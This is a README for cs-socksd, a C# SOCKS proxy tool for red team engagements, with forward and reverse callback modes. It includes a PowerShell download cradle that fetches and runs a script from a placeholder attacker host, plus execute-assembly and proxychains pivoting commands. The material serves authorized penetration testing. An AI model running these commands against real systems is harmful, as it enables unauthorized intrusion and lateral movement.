# cs-socksd

Lightweight SOCKS4/5 proxy server written in C# for red team engagements.
Port of [socksd](https://github.com/totekuh/socksd).

Single-file, zero dependencies, targets .NET Framework 4.x.
Runs on any modern Windows machine (Win7+ / Server 2012+) out of the box — no install required.

## Features

| | |
|---|---|
| **Protocol** | SOCKS5 CONNECT (IPv4, IPv6, domain names), SOCKS4/4a (auto-detected) |
| **Auth** | Optional username/password, auth-once IP whitelisting |
| **Reverse mode** | Agent calls back to operator — no inbound ports needed on target |
| **Concurrency** | Async I/O via `TcpListener` / `TcpClient` |
| **Timeout** | Configurable idle disconnect on relayed connections (default: 15 min) |
| **Execution** | Native `.exe`, reflective PowerShell loader, `execute-assembly` |
| **Runtime** | .NET Framework 4.x (pre-installed on every modern Windows box) |

## Quick Start

Download `socksd.exe` and `socksd.ps1` from the [Releases](https://github.com/totekuh/cs-socksd/releases) page.

### Forward Mode (listener on target)

```
socksd.exe -p 1080
socksd.exe -i 10.10.10.100 -p 4200 -u admin -P secret
socksd.exe -q -b -p 1080
socksd.exe -p 1080 -t 5 -c 50
```

```bash
# From Kali
curl --socks5-hostname TARGET:1080 http://ifconfig.me
nmap -sT -Pn --proxies socks4://TARGET:1080 -p- TARGET
```

### Reverse Mode (agent calls back to operator)

On Kali, start the listener:
```bash
python3 listener.py -c 9001 -s 1080
```

On the target, connect back:
```
socksd.exe -R KALI_IP:9001
```

From Kali, use the proxy:
```bash
curl --socks5-hostname 127.0.0.1:1080 http://ifconfig.me
nmap -sT -Pn --proxies socks4://127.0.0.1:1080 -p- 10.10.10.0/24
proxychains nxc smb 127.0.0.1
```

The agent auto-reconnects every 5 seconds if the control channel drops.

### Fileless Execution

```powershell
# Reflective loader from disk
powershell -ep bypass -f socksd.ps1 -p 1080

# Reverse mode via loader
powershell -ep bypass -f socksd.ps1 -Reverse KALI_IP:9001

# Download cradle
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/socksd.ps1'); Invoke-SocksD -p 1080

# Execute-assembly (Cobalt Strike, etc.)
execute-assembly socksd.exe -p 1080
execute-assembly socksd.exe -R KALI_IP:9001
```

## Options

```
-i, --ip <addr>      Listen address (default: 0.0.0.0)
-p, --port <port>    Listen port (default: 1080)
-u, --user <user>    Username for SOCKS5 auth
-P, --pass <pass>    Password for SOCKS5 auth
-t, --timeout <min>  Idle timeout in minutes (default: 15)
-c, --max-conn <n>   Max concurrent connections (default: unlimited)
-R, --reverse <h:p>  Reverse-connect to listener at host:port
-1, --auth-once      Whitelist IP after first successful auth
-b, --bind           Bind outgoing connections to listen IP
-q, --quiet          Suppress all output
-v, --version        Show version
-h, --help           Show help message
```

SOCKS4 and SOCKS5 are auto-detected on the same port — no flag needed. Use `--socks5-hostname` with curl, `socks4://` with nmap `--proxies`.

The `-1` (auth-once) flag is useful for clients like Firefox that don't support SOCKS5 authentication — authenticate once with a tool like `curl`, then the source IP is whitelisted for subsequent unauthenticated connections.

## Listener (Operator Side)

`listener.py` is the Python listener for reverse mode. Runs on the operator's machine (Kali).

```
-c, --callback-port  Agent callback port (default: 9001)
-s, --socks-port     Local SOCKS5 port (default: 1080)
-b, --bind           Bind address (default: 0.0.0.0)
-q, --quiet          Suppress log output
```

## Building from Source

Cross-compiled on Linux via Mono:

```bash
sudo apt install mono-devel
```

```bash
make          # compile socksd.exe
make loader   # generate socksd.ps1 reflective loader
make all      # both
make test     # deploy to VM and run functional tests
make clean    # remove build artifacts
```
